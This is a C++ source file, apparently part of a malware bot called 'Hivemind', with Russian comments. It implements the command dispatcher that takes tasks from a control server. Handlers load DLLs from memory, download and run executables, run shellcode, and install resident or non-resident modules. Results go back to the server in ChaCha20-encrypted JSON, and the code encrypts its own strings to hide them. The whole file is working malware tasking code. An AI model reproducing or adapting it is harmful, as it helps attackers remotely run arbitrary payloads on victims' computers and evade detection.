#include "operationdispatcher.hpp"
#include "commands.hpp"
#include "strings.hpp"
#include "NetChannel.hpp"

HivemindOperationDispatcher::HivemindOperationDispatcher()
{
#ifdef _DEBUG
	WriteLog(L"[HivemindOperationDispatcher] constructor");
#endif
}

HivemindOperationDispatcher::~HivemindOperationDispatcher()
{
#ifdef _DEBUG
	WriteLog(L"[HivemindOperationDispatcher] destructor");
#endif
}

// обработка модулей должна быть однопоточна из-за постоянного msystem экзепляра использование которого thread unsafe
BOOL HivemindOperationDispatcher::dispatch(IProtocolParser *proto_parser, PWCHAR pwDomainName, PWCHAR pwIP, PWCHAR pwchSessionJson, IModuleSystem *msystem)
{
	BOOL bRet = FALSE;

	blob *hmOperationBlob = proto_parser->get_result();
	if ((hmOperationBlob == nullptr) || (hmOperationBlob->lpBuffer == nullptr) || (hmOperationBlob->dwBufSize < sizeof(hivemind_operation_data)))
	{
		WriteLog(L"[HivemindOperationDispatcher::dispatch] nothing to dispatch");
		return TRUE;
	}

	UINT iOperationsAmount = hmOperationBlob->dwBufSize / sizeof(hivemind_operation_data);
	hivemind_operation_data *hmOpData = (hivemind_operation_data*)hmOperationBlob->lpBuffer;

#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[HivemindOperationDispatcher::dispatch] dispathing %d bytes, amount of operations = %d", hmOperationBlob->dwBufSize, iOperationsAmount);
	WriteLog(debugOut);
#endif

	dispatcher::pophandler_argument hndlArgument = nullptr;
	for (UINT i = 0; i < iOperationsAmount; i++, hmOpData++)
	{
		// аргумент освобождается в вызываемом потоке
		hndlArgument = new dispatcher::ophandler_argument;
		if (hndlArgument == nullptr)
			continue;

		RtlSecureZeroMemory(hndlArgument, sizeof(dispatcher::ophandler_argument));

		// заполнить данные для передачи, скопировав из спаршенной структуры, так как время жизни data и cid == время жизни hmOperationBlob, который освобождается в деструкторе
		hndlArgument->dataArg.dwBufSize = hmOpData->data.dwBufSize;
		hndlArgument->dataArg.lpBuffer = nullptr;
		hndlArgument->cidArg.dwBufSize = hmOpData->cid.dwBufSize;
		hndlArgument->cidArg.lpBuffer = nullptr;

		if (hmOpData->data.lpBuffer != nullptr)
		{
			hndlArgument->dataArg.lpBuffer = new BYTE[hndlArgument->dataArg.dwBufSize + 1];
			if (hndlArgument->dataArg.lpBuffer != nullptr)
				_RtlCopyMemory(hndlArgument->dataArg.lpBuffer, hmOpData->data.lpBuffer, hndlArgument->dataArg.dwBufSize);
		}

		if (hmOpData->cid.lpBuffer != nullptr)
		{
			hndlArgument->cidArg.lpBuffer = new BYTE[hndlArgument->cidArg.dwBufSize + 1];
			if (hndlArgument->cidArg.lpBuffer != nullptr)
				_RtlCopyMemory(hndlArgument->cidArg.lpBuffer, hmOpData->cid.lpBuffer, hndlArgument->cidArg.dwBufSize);
		}

		hndlArgument->pwDomainName = nullptr;
		if (pwDomainName != nullptr)
		{
			hndlArgument->pwDomainName = new WCHAR[wcslen(pwDomainName) + 1 + 1];
			if (hndlArgument->pwDomainName != nullptr)
				wcscpy(hndlArgument->pwDomainName, pwDomainName);
		}

		hndlArgument->pwIP = nullptr;
		if (pwIP != nullptr)
		{
			hndlArgument->pwIP = new WCHAR[wcslen(pwIP) + 1 + 1];
			if (hndlArgument->pwIP != nullptr)
				wcscpy(hndlArgument->pwIP, pwIP);
		}

		hndlArgument->pwJsonSession = nullptr;
		if (pwchSessionJson != nullptr)
		{
			hndlArgument->pwJsonSession = new WCHAR[wcslen(pwchSessionJson) + 1 + 1];
			if (hndlArgument->pwJsonSession != nullptr)
				wcscpy(hndlArgument->pwJsonSession, pwchSessionJson);
		}

		hndlArgument->msystem = msystem;

		HANDLE hThread = NULL;
		switch (hmOpData->hmOperationType)
		{
		case hivemind_op_type_t::OPERATION_TYPE_COMMAND:
			hndlArgument->additional.hmCommandType = hmOpData->additional.hmCommandType;
			hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)dispatcher::CommandDispatcher, (LPVOID)hndlArgument, NULL, NULL);

			WaitForSingleObject(hThread, WAIT_FOR_DISPATCHER_TIMEOUT);
			CloseHandle(hThread);

			break;
		case hivemind_op_type_t::OPERATION_TYPE_MODULE:
			hndlArgument->additional.hmModuleType = hmOpData->additional.hmModuleType;
			// однопоточная загрузка модулей из-за трудности синхронизации vfs, а также ввиду того факта, что подсистема загрузки модулей - одна
			dispatcher::ModuleDispatcher(hndlArgument);
			break;
		case hivemind_op_type_t::OPERATION_TYPE_IGNORE_UNKNOWN:
#ifdef _DEBUG
			WriteLog(L"[HivemindOperationDispatcher::dispatch] ignoring unknown operation");
#endif
			break;
		}


		hndlArgument = nullptr;
	}

	return bRet;
}

VOID dispatcher::free_ophandler(pophandler_argument  *arg)
{
	pophandler_argument pMemPtr = *arg;
	if (pMemPtr != nullptr)
	{
		if (pMemPtr->dataArg.lpBuffer != nullptr)
			delete[]pMemPtr->dataArg.lpBuffer;

		if (pMemPtr->cidArg.lpBuffer != nullptr)
			delete[]pMemPtr->cidArg.lpBuffer;

		if (pMemPtr->pwDomainName != nullptr)
			delete[]pMemPtr->pwDomainName;

		if (pMemPtr->pwIP != nullptr)
			delete[]pMemPtr->pwIP;
		
		if (pMemPtr->pwJsonSession != nullptr)
			delete[]pMemPtr->pwJsonSession;

		delete pMemPtr;
		*arg = nullptr;
	}

	return;
}



DWORD WINAPI dispatcher::CommandDispatcher(pophandler_argument arg)
{
#ifdef _DEBUG
	WriteLog(L"[dispatcher::CommandDispatcher] executed thread to dispatch the command");
#endif

	ICommandExecutor *command = nullptr;
	blob *pbDataBuffer = nullptr;
	do
	{
		if ((arg->dataArg.lpBuffer == nullptr) || (arg->dataArg.dwBufSize == 0))
			break;

		pbDataBuffer = dispatcher::base64decode((PCHAR)arg->dataArg.lpBuffer);
		if ((pbDataBuffer == nullptr) || (pbDataBuffer->lpBuffer == nullptr) || (pbDataBuffer->dwBufSize == 0))
			break;

		DWORD dwRet = -1;
		switch (arg->additional.hmCommandType)
		{
		case _hivemind_command_type::COMMAND_CMDEXEC:
			//dwRet = dispatcher::CmdExec(pbDataBuffer);
			break;
		case _hivemind_command_type::COMMAND_DLLLOADER:
			command = (ICommandExecutor*)new PeLoader;
			if (command)
			{
				command->execute(pbDataBuffer);
				dwRet = command->get_status()->status.dll_status;
			}
			break;
		case _hivemind_command_type::COMMAND_DOWNLOADEXEC:
			command = (ICommandExecutor*)new DownloadExecute;
			if (command)
			{
				command->execute(pbDataBuffer);
				dwRet = command->get_status()->status.de_status;
			}
			break;
		case _hivemind_command_type::COMMAND_SHELLCODE:
			command = (ICommandExecutor*)new ShellcodeLoader;
			if (command)
			{
				command->execute(pbDataBuffer);
				dwRet = command->get_status()->status.sc_status;
			}
			break;
		case _hivemind_command_type::COMMAND_UNKNOWN:
			break;
		}

		if ((command == nullptr) || (!SendCommandStatus(arg, dwRet, &command->get_status()->data_result)))
		{
#ifdef _DEBUG
			WriteLog(L"[dispatcher::CommandDispatcher] cant report result code");
#endif
		}

	}
	while (FALSE);

	if (pbDataBuffer != nullptr)
	{
		if (pbDataBuffer->lpBuffer != nullptr)
			delete[]pbDataBuffer->lpBuffer;
		delete pbDataBuffer;
		pbDataBuffer = nullptr;
	}

	if (command != nullptr)
	{
		delete command;
		command = nullptr;
	}

	free_ophandler(&arg);
	ExitThread(0);
}

// однопоточная загрузка модулей
DWORD WINAPI dispatcher::ModuleDispatcher(pophandler_argument arg)
{
#ifdef _DEBUG
	WriteLog(L"[dispatcher::ModuleDispatcher] inside ModuleDispatcher to dispatch the module");
#endif

	blob *pbDataBuffer = nullptr;
	do
	{
		if ((arg == nullptr) || (arg->dataArg.lpBuffer == 0) || (arg->dataArg.dwBufSize == 0) || (arg->msystem == nullptr) || (arg->msystem->is_initialized() == FALSE))
			break;

		pbDataBuffer = dispatcher::base64decode((PCHAR)arg->dataArg.lpBuffer);
		if ((pbDataBuffer == nullptr) || (pbDataBuffer->lpBuffer == nullptr) || (pbDataBuffer->dwBufSize == 0))
			break;

		switch (arg->additional.hmModuleType)
		{
		case _hivemind_module_type::MODULE_NONRESIDENT:
#ifdef _DEBUG
			WriteLog(L"[dispatcher::ModuleDispatcher] loading non resident module");
#endif
			arg->msystem->load_nonresident(pbDataBuffer);
			break;
		case _hivemind_module_type::MODULE_RESIDENT:
#ifdef _DEBUG
			WriteLog(L"[dispatcher::ModuleDispatcher] loading resident module");
#endif
			arg->msystem->load_resident(pbDataBuffer, TRUE);
			break;
		case _hivemind_module_type::MODULE_UNKNOWN:
#ifdef _DEBUG
			WriteLog(L"[dispatcher::ModuleDispatcher] unknown type of module, ignoring");
#endif
			break;
		}
	} while (FALSE);

	if (pbDataBuffer != nullptr)
	{
		if (pbDataBuffer->lpBuffer != nullptr)
			delete[]pbDataBuffer->lpBuffer;
		delete pbDataBuffer;
		pbDataBuffer = nullptr;
	}

	free_ophandler(&arg);
	return 0;
}

BOOL dispatcher::SendCommandStatus(pophandler_argument arg, DWORD dwReturnCode, blob *pbResultData)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif
	if ((pbResultData == nullptr) || (arg == nullptr) || (arg->pwJsonSession == nullptr))
	{
#ifdef _DEBUG
		wsprintfW(debugOut, L"[dispatcher::SendCommandStatus] error invalid arguments, pbResultData = 0x%x, arg = 0x%x, arg->pwJsonSession = 0x%x", pbResultData, arg, arg->pwJsonSession);
		WriteLog(debugOut);
#endif
		return FALSE;
	}

	WCHAR wchCid[CIDFIELD_MAXLEN_CHARS + 1];
	RtlSecureZeroMemory(&wchCid, sizeof(wchCid));

	BOOL bRet = FALSE;

	CCryptString cStr_session(cryptedstr_Session);
	CCryptString cStr_op(cryptedstr_op);
	CCryptString cStr_command(cryptedstr_command);
	CCryptString cStr_type(cryptedstr_type);
	CCryptString cStr_de(cryptedstr_de);
	CCryptString cStr_dl(cryptedstr_dl);
	CCryptString cStr_sc(cryptedstr_sc);
	CCryptString cStr_ce(cryptedstr_ce);
	CCryptString cStr_cid(cryptedstr_cid);

	JsonBuilder jbuilder;
	UINT uMaxJsonSize = DEFAULT_JSON_MAXLENGTH;
	if (pbResultData->dwBufSize > 0)
		uMaxJsonSize += pbResultData->dwBufSize + 1;

	IControlServer *connector = nullptr;
	blob blResponse;
	RtlSecureZeroMemory(&blResponse, sizeof(blResponse));
	do
	{
#ifdef _DEBUG_CHANNEL
		connector = (IControlServer*)new DebugFileChannel;
#else
		connector = (IControlServer*)new WinHttpAbsLayer;
#endif

		if (connector == nullptr)
		{
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] cant create connector");
#endif
			break;
		}

#ifdef _DISABLE_TRAFFCRYPT
		connector->init(nullptr, nullptr, 0, nullptr);
#else
		connector->init(netcrypto::EncryptChacha20, netcrypto::DecryptChacha20, 0, nullptr);
#endif

		if (!jbuilder.init(uMaxJsonSize))
		{
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] cant init json builder");
#endif
			break;
		}
		
		if (!Convert2UTF16LE((PCHAR)arg->cidArg.lpBuffer, wchCid, sizeof(wchCid) / sizeof(WCHAR)))
		{
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] error converting cid to utf16le");
#endif
			break;
		}

		jbuilder.add(cStr_op.w_str(), cStr_command.w_str());
		jbuilder.add(cStr_cid.w_str(), wchCid);

		// создадим json для отправки результата исходя из конкретной команды
		switch (arg->additional.hmCommandType)
		{
		case hivemind_command_type_t::COMMAND_CMDEXEC:
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] serializing result of cmdexec");
#endif
			jbuilder.add(cStr_type.w_str(), cStr_ce.w_str());
			dispatcher::AppendCmdExecStatus(&jbuilder, dwReturnCode);
			break;
		case hivemind_command_type_t::COMMAND_DLLLOADER:
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] serializing result of dllloader");
#endif
			jbuilder.add(cStr_type.w_str(), cStr_dl.w_str());
			dispatcher::AppendDllLoaderStatus(&jbuilder, dwReturnCode);
			break;
		case hivemind_command_type_t::COMMAND_DOWNLOADEXEC:
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] serializing result of downloadexec");
#endif
			jbuilder.add(cStr_type.w_str(), cStr_de.w_str());
			dispatcher::AppendDExecStatus(&jbuilder, dwReturnCode);
			break;
		case hivemind_command_type_t::COMMAND_SHELLCODE:
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] serializing result of shellcode loader");
#endif
			jbuilder.add(cStr_type.w_str(), cStr_sc.w_str());
			dispatcher::AppendShellcodeStatus(&jbuilder, dwReturnCode);
			break;
		case hivemind_command_type_t::COMMAND_UNKNOWN:
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] serializing result that command is unknown");
#endif
			break;
		}

		jbuilder.add_subsidiary_json(cStr_session.w_str(), arg->pwJsonSession);
		PWCHAR pwchJsonData = jbuilder.finish();
		if (pwchJsonData)
		{

#ifndef _DEBUG_CHANNEL
			bRet = connector->send(arg->pwIP, arg->pwDomainName, (LPBYTE)pwchJsonData, wcslen(pwchJsonData) * 2 + 2, &blResponse.lpBuffer, &blResponse.dwBufSize);
#else // если дебаг канал то не ебем себе мозги файлами, ибо ответ тут не требуется.
			bRet = TRUE;
#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] debug channel is used so we do not call send method");
#endif
#endif

#ifdef _DEBUG
			WriteLog(L"[dispatcher::SendCommandStatus] Status json: ", pwchJsonData);
#endif
		}

	} while (FALSE);

	if (blResponse.lpBuffer != nullptr)
	{
		VirtualFree(blResponse.lpBuffer, 0, MEM_RELEASE);
		RtlSecureZeroMemory(&blResponse, sizeof(blResponse));
	}

	if (connector != nullptr)
		delete connector;

	return bRet;
}

VOID dispatcher::AppendDllLoaderStatus(JsonBuilder * jbuilder, DWORD dwReturnCode)
{
	CCryptString cStr_success(cryptedstr_success);
	CCryptString cStr_seunknown(cryptedstr_seunknown);
	CCryptString cStr_status(cryptedstr_status);
	CCryptString cStr_seinvpe(cryptedstr_seinvpe);
	CCryptString cStr_sedotnet(cryptedstr_sedotnet);
	CCryptString cStr_seexdir(cryptedstr_seexdir);
	CCryptString cStr_seinvarch(cryptedstr_seinvarch);
	CCryptString cStr_setls(cryptedstr_setls); 

	switch ((dllloader_status_t)dwReturnCode)
	{
	case dllloader_status_t::STATUS_DL_SUCCESS:
		jbuilder->add(cStr_status.w_str(), cStr_success.w_str());
		break;
	case dllloader_status_t::STATUS_ERROR_DL_COM_DIRECTORY:
		jbuilder->add(cStr_status.w_str(), cStr_sedotnet.w_str());
		break;
	case dllloader_status_t::STATUS_ERROR_DL_EXCEPTION_DIRECTORY:
		jbuilder->add(cStr_status.w_str(), cStr_seexdir.w_str());
		break;
	case dllloader_status_t::STATUS_ERROR_DL_INVALIDPE:
		jbuilder->add(cStr_status.w_str(), cStr_seinvpe.w_str());
		break;
	case dllloader_status_t::STATUS_ERROR_DL_INVALID_ARCH:
		jbuilder->add(cStr_status.w_str(), cStr_seinvarch.w_str());
		break;
	case dllloader_status_t::STATUS_ERROR_DL_TLS_DIRECTORY:
		jbuilder->add(cStr_status.w_str(), cStr_setls.w_str());
		break;
	case dllloader_status_t::STATUS_ERROR_DL_UNKNOWN:
		jbuilder->add(cStr_status.w_str(), cStr_seunknown.w_str());
		break;
	}

	return;
}

VOID dispatcher::AppendShellcodeStatus(JsonBuilder * jbuilder, DWORD dwReturnCode)
{
	CCryptString cStr_success(cryptedstr_success);
	CCryptString cStr_seunknown(cryptedstr_seunknown);
	CCryptString cStr_status(cryptedstr_status);


	switch ((shellcodeloader_status_t)dwReturnCode)
	{
	case shellcodeloader_status_t::STATUS_ERROR_SC_SUCCESS:
		jbuilder->add(cStr_status.w_str(), cStr_success.w_str());
		break;
	case shellcodeloader_status_t::STATUS_ERROR_SC_UNKNOWN:
		jbuilder->add(cStr_status.w_str(), cStr_seunknown.w_str());
		break;
	}

	return;
}

VOID dispatcher::AppendDExecStatus(JsonBuilder * jbuilder, DWORD dwReturnCode)
{
	CCryptString cStr_success(cryptedstr_success);
	CCryptString cStr_secfad(cryptedstr_secfad);
	CCryptString cStr_secfunknown(cryptedstr_secfunknown);
	CCryptString cStr_seexad(cryptedstr_seexad);
	CCryptString cStr_seex404(cryptedstr_seex404);
	CCryptString cStr_seexunknown(cryptedstr_seexunknown);
	CCryptString cStr_seinvpe(cryptedstr_seinvpe);
	CCryptString cStr_seperr(cryptedstr_seperr);
	CCryptString cStr_seunknown(cryptedstr_seunknown);
	CCryptString cStr_status(cryptedstr_status);

	switch ((downloadexec_status_t)dwReturnCode)
	{
	case downloadexec_status_t::STATUS_DE_SUCCESS:
		jbuilder->add(cStr_status.w_str(), cStr_success.w_str());
		break;
	case downloadexec_status_t::STATUS_ERROR_DE_CREATE_FILE_ACCESSDENIED:
		jbuilder->add(cStr_status.w_str(), cStr_secfad.w_str());
		break;
	case downloadexec_status_t::STATUS_ERROR_DE_CREATE_FILE_UNKNOWN:
		jbuilder->add(cStr_status.w_str(), cStr_secfunknown.w_str());
		break;
	case downloadexec_status_t::STATUS_ERROR_DE_EXEC_ACCESSDENIED:
		jbuilder->add(cStr_status.w_str(), cStr_seexad.w_str());
		break;
	case downloadexec_status_t::STATUS_ERROR_DE_EXEC_FILENOTFOUND:
		jbuilder->add(cStr_status.w_str(), cStr_seex404.w_str());
		break;
	case downloadexec_status_t::STATUS_ERROR_DE_EXEC_UNKNOWN:
		jbuilder->add(cStr_status.w_str(), cStr_seexunknown.w_str());
		break;
	case downloadexec_status_t::STATUS_ERROR_DE_INVALIDPE:
		jbuilder->add(cStr_status.w_str(), cStr_seinvpe.w_str());
		break;
	case downloadexec_status_t::STATUS_ERROR_DE_PATH_ERROR:
		jbuilder->add(cStr_status.w_str(), cStr_seperr.w_str());
		break;
	case downloadexec_status_t::STATUS_ERROR_DE_UNKNOWN:
		jbuilder->add(cStr_status.w_str(), cStr_seunknown.w_str());
		break;
	}
	return;
}

VOID dispatcher::AppendCmdExecStatus(JsonBuilder * jbuilder, DWORD dwReturnCode)
{
	// not implemended cmdexec
#ifdef _DEBUG
	WriteLog(L"[dispatcher::AppendCmdExecStatus] cmd is not implemented");
#endif
	CCryptString cStr_seunknown(cryptedstr_seunknown);
	CCryptString cStr_status(cryptedstr_status);

	jbuilder->add(cStr_status.w_str(), cStr_seunknown.w_str());

	return;
}



blob * dispatcher::base64decode(PCHAR pBase64)
{
	blob *pbResultBuffer = nullptr;
	if (pBase64 == nullptr)
		return nullptr;

	pbResultBuffer = new blob;
	if (pbResultBuffer == nullptr)
		return nullptr;

	pbResultBuffer->dwBufSize = 0;
	pbResultBuffer->lpBuffer = nullptr;

	pbResultBuffer->lpBuffer = Base64toBinary(pBase64, &pbResultBuffer->dwBufSize);
	return pbResultBuffer;
}
